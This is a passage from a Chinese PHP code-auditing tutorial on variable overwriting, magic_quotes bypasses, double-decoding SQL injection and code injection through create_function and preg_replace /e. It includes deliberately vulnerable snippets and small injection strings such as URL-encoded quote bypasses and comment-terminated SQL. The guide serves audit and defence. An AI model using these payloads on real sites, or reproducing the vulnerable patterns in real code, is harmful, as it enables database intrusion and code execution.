class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//var.php?a=fuck</span></span><br><span class="line">$a=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$chs = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>) &#123;</span><br><span class="line">$chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$$key = $chs-&gt;Convert($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($chs);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><h4 id="parse-str-变量覆盖漏洞"><a class="header-anchor" href="#parse-str-变量覆盖漏洞">null</a>parse_str()变量覆盖漏洞</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=new</span></span><br><span class="line">$var = <span class="string">'init'</span>;                     </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]); </span><br><span class="line"><span class="keyword">print</span> $var;</span><br></pre></td></tr></table></figure><p>该函数一样可以覆盖数组变量，上面的代码是通过$<code>_</code>SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=1&amp;a[1]=var1%3d222</span></span><br><span class="line">$var1 = <span class="string">'init'</span>;</span><br><span class="line">parse_str($a[$_GET[<span class="string">'var'</span>]]);</span><br><span class="line"><span class="keyword">print</span> $var1;</span><br></pre></td></tr></table></figure><p>上面的代码通过提交$var来实现对$var1的覆盖。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略（parse_str）</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符parse_str </td></tr></tbody></table><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略（mb_parse_str）</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2<br>系统要求：无<br>审计策略：查找字符mb_parse_str </td></tr></tbody></table><h4 id="import-request-variables-变量覆盖漏洞"><a class="header-anchor" href="#import-request-variables-变量覆盖漏洞">null</a>import_request_variables()变量覆盖漏洞</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'GLOBALS '</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"n"</span>;</span><br><span class="line">import_request_variables(<span class="string">'GPC'</span>);</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'10.1.1.1'</span>) <span class="keyword">die</span>(<span class="string">'Go away!'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello admin!'</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略（import_request_variables）</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2<br>系统要求：无<br>审计策略：查找字符import_request_variables </td></tr></tbody></table><h4 id="php5-globals"><a class="header-anchor" href="#php5-globals">null</a>PHP5 Globals</h4><p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">// register_globals =ON</span></span><br><span class="line"><span class="comment">//foo.php?GLOBALS[foobar]=HELLO</span></span><br><span class="line">php <span class="keyword">echo</span> $foobar; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是很多的程序没有考虑到这点，请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为了安全取消全局变量</span></span><br><span class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">'register_globals'</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="keyword">print</span> $_GET[b];</span><br></pre></td></tr></table></figure><p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><h3 id="magic-quotes-gpc与代码安全"><a class="header-anchor" href="#magic-quotes-gpc与代码安全">null</a>magic_quotes_gpc与代码安全</h3><h4 id="什么是magic-quotes-gpc"><a class="header-anchor" href="#什么是magic-quotes-gpc">null</a>什么是magic_quotes_gpc</h4><p>当打开时，所有的 '（单引号），&quot;（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p><h4 id="哪些地方没有魔术引号的保护"><a class="header-anchor" href="#哪些地方没有魔术引号的保护">null</a>哪些地方没有魔术引号的保护</h4><p><strong>1) $<code>_</code>SERVER变量</strong></p><p>PHP5的$<code>_</code>SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略（$<code>_</code>SERVER变量）</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符<code>_</code>SERVER </td></tr></tbody></table><p><strong>2) getenv()得到的变量（使用类似$<code>_</code>SERVER变量）</strong></p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略（getenv()）</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符getenv </td></tr></tbody></table><p><strong>3) $HTTP_RAW_POST_DATA与PHP输入、输出流</strong></p><p>主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</span><br><span class="line">$HTTP_RAW_POST_DATA = file_get_contents( <span class="string">'php://input'</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($HTTP_RAW_POST_DATA) )</span><br><span class="line">$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略（数据流）</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符HTTP_RAW_POST_DATA或者php://input </td></tr></tbody></table><p><strong>4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by</strong></p><p>如Discuz!&lt;5.0的pm.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($msgtobuddys)) &#123;</span><br><span class="line">$msgto = array_merge($msgtobuddys, <span class="keyword">array</span>($msgtoid));</span><br><span class="line">......</span><br><span class="line"><span class="keyword">foreach</span>($msgto <span class="keyword">as</span> $uid) &#123;</span><br><span class="line">$uids .= $comma.$uid;</span><br><span class="line">$comma = <span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">$query = $db-&gt;query(<span class="string">"SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</span></span><br><span class="line"><span class="string">LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</span></span><br><span class="line"><span class="string">WHERE m.uid IN ($uids)"</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找数据库操作字符（select,update,insert等等） </td></tr></tbody></table><h4 id="变量的编码与解码"><a class="header-anchor" href="#变量的编码与解码">null</a>变量的编码与解码</h4><p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。</p><p>这个类型的主要函数有：</p><p><strong>1) stripslashes() 这个其实就是一个decode-addslashes()</strong></p><p><strong>2) 其他字符串转换函数：</strong></p><table><thead><tr><th style="text-align:left">base64_decode</th><th style="text-align:left">对使用 MIME base64 编码的数据进行解码</th></tr></thead><tbody><tr><td style="text-align:left">base64_encode</td><td style="text-align:left">使用 MIME base64 对数据进行编码</td></tr><tr><td style="text-align:left">rawurldecode</td><td style="text-align:left">对已编码的 URL 字符串进行解码</td></tr><tr><td style="text-align:left">rawurlencode</td><td style="text-align:left">按照 RFC 1738 对 URL 进行编码</td></tr><tr><td style="text-align:left">urldecode</td><td style="text-align:left">解码已编码的 URL 字符串</td></tr><tr><td style="text-align:left">urlencode</td><td style="text-align:left">编码 URL 字符串</td></tr><tr><td style="text-align:left">…</td><td style="text-align:left">…</td></tr></tbody></table><p><em>另外一个 unserialize/serialize</em></p><p><strong>3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等</strong></p><p>目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM article WHERE articleid=&apos;&quot;.urldecode($_GET[id]).&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure><p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM article WHERE articleid=&apos;&apos;&apos;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应的编码函数 </td></tr></tbody></table><h4 id="二次攻击"><a class="header-anchor" href="#二次攻击">null</a>二次攻击</h4><p><em>详细见附录<code>[</code>1<code>]</code></em></p><p><strong>1)数据库出来的变量没有进行过滤</strong></p><p><strong>2)数据库的转义符号：</strong></p><ul><li>mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为’，当我们update进入数据库时，通过转义变为’）</li><li>mssql的转义字符为’（所以我们提交’通过魔术引号变化为’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）</li></ul><p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><h4 id="魔术引号带来的新的安全问题"><a class="header-anchor" href="#魔术引号带来的新的安全问题">null</a>魔术引号带来的新的安全问题</h4><p>首先我们看下魔术引号的处理机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0]</span><br></pre></td></tr></table></figure><p>这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p><p><strong>1)得到原字符（’,,&quot;,null]）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交                 '</span></span><br><span class="line"><span class="comment">//魔术引号处理         \'</span></span><br><span class="line"><span class="comment">//substr               '</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</span><br><span class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</span><br><span class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</span><br><span class="line">   <span class="string">" WHERE order_sn = '$order_sn' LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p><strong>2)得到“\”字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交                 '</span></span><br><span class="line"><span class="comment">//魔术引号处理         \'</span></span><br><span class="line"><span class="comment">//substr               \    </span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</span><br><span class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</span><br><span class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</span><br><span class="line">   <span class="string">" WHERE order_sn = '$order_sn' and order_tn='"</span>.$_GET[<span class="string">'order_tn'</span>].<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>提交内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</span><br></pre></td></tr></table></figure><p>执行的SQL语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_id, order_status, shipping_status, pay_status, shipping_time, </span><br><span class="line">shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = <span class="string">'\' and </span></span><br><span class="line"><span class="string">order_tn='</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">/*'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符串处理函数如substr或者通读代码 </td></tr></tbody></table><h4 id="变量key与魔术引号"><a class="header-anchor" href="#变量key与魔术引号">null</a>变量key与魔术引号</h4><p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">print</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>1)当magic_quotes_gpc = On时，在php5.24下测试显示：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa\&apos;aaa</span><br><span class="line">bb\&apos;b</span><br></pre></td></tr></table></figure><p>从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></span><br><span class="line">print_R($_GET); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果显示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [aaaa&apos;aaa] =&gt; Array ( [bb\&apos;] =&gt; 1 ) )</span><br></pre></td></tr></table></figure><p>数组第一维变量的key不受魔术引号的影响。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4和php&lt;5.2.1<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><p><strong>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa&apos;aaa</span><br><span class="line">bb&apos;b</span><br></pre></td></tr></table></figure><p>对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//keyvul.php?aaa'aa=1'</span></span><br><span class="line"><span class="comment">//magic_quotes_gpc = Off</span></span><br><span class="line"> <span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"> $_GET  = addslashes_array($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_array</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_array'</span>, $value) : addslashes($value);</span><br><span class="line">&#125;</span><br><span class="line">print_R($_GET);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [aaa&apos;aa] =&gt; 1\&apos;</span><br><span class="line">)</span><br><span class="line">aaa&apos;aa</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><h3 id="代码注射"><a class="header-anchor" href="#代码注射">null</a>代码注射</h3><h4 id="php中可能导致代码注射的函数"><a class="header-anchor" href="#php中可能导致代码注射的函数">null</a>PHP中可能导致代码注射的函数</h4><p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：</p><table><thead><tr><th style="text-align:left">assert()</th></tr></thead><tbody><tr><td style="text-align:left">call_user_func()</td></tr><tr><td style="text-align:left">call_user_func_array()</td></tr><tr><td style="text-align:left">create_function()</td></tr><tr><td style="text-align:left">变量函数</td></tr><tr><td style="text-align:left">…</td></tr></tbody></table><p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line">$sort_by=$_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$sorter=<span class="string">'strnatcasecmp'</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</span><br><span class="line">$sort_function = <span class="string">'  return 1 * '</span> . $sorter . <span class="string">'($a["'</span> . $sort_by . <span class="string">'"], $b["'</span> . $sort_by . <span class="string">'"]);</span></span><br><span class="line"><span class="string">      '</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） </td></tr></tbody></table><h4 id="变量函数与双引号"><a class="header-anchor" href="#变量函数与双引号">null</a>变量函数与双引号</h4><p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$a\n&quot;;</span><br><span class="line">echo &apos;$a\n&apos;;</span><br></pre></td></tr></table></figure><p>我们再看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line"><span class="keyword">if</span>($globals[<span class="string">'bbc_email'</span>])&#123;</span><br><span class="line"></span><br><span class="line">$text = preg_replace(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"/\[email=(.*?)\](.*?)\[\/email\]/ies"</span>,</span><br><span class="line"><span class="string">"/\[email\](.*?)\[\/email\]/ies"</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'check_email("$1", "$2")'</span>,</span><br><span class="line"><span class="string">'check_email("$1", "$1")'</span>), $text);</span><br></pre></td></tr></table></figure><p>另外很多的应用程序都把变量用&quot;&quot;存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><h3 id="php自身函数漏洞及缺陷"><a class="header-anchor" href="#php自身函数漏洞及缺陷">null</a>PHP自身函数漏洞及缺陷</h3><h4 id="php函数的溢出漏洞"><a class="header-anchor" href="#php函数的溢出漏洞">null</a>PHP函数的溢出漏洞</h4><p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录<a href="2.md">2</a>）项目么，其中比较有名的要算是unserialize()，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . &apos;_data&apos;]);</span><br></pre></td></tr></table></figure><p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：对应fix的版本<br>系统要求：<br>审计策略：查找对应函数名 </td></tr></tbody></table><h4 id="php函数的其他漏洞"><a class="header-anchor" href="#php函数的其他漏洞">null</a>PHP函数的其他漏洞</h4><p>Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability</p><p>比如phpwind早期的serarch.php里的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>($uids);</span><br><span class="line">......</span><br><span class="line">$query=$db-&gt;query(<span class="string">"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'"</span>);</span><br><span class="line"><span class="keyword">while</span>($member=$db-&gt;fetch_array($query))&#123;</span><br><span class="line">$uids .= $member[<span class="string">'uid'</span>].<span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uids ? $uids=substr($uids,<span class="number">0</span>,<span class="number">-1</span>) : $sqlwhere.=<span class="string">' AND 0 '</span>;</span><br><span class="line">........</span><br><span class="line">$query = $db-&gt;query(<span class="string">"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.3 php5&lt;5.14<br>系统要求：无<br>审计策略：查找unset </td></tr></tbody></table><h4 id="session-destroy-删除文件漏洞"><a class="header-anchor" href="#session-destroy-删除文件漏洞">null</a>session_destroy()删除文件漏洞</h4><p><em>测试PHP版本：5.1.2</em></p><p>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//val.php   </span></span><br><span class="line">session_save_path(<span class="string">'./'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'del'</span>]) &#123;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$_SESSION[<span class="string">'hei'</span>]=<span class="number">1</span>;</span><br><span class="line"><span 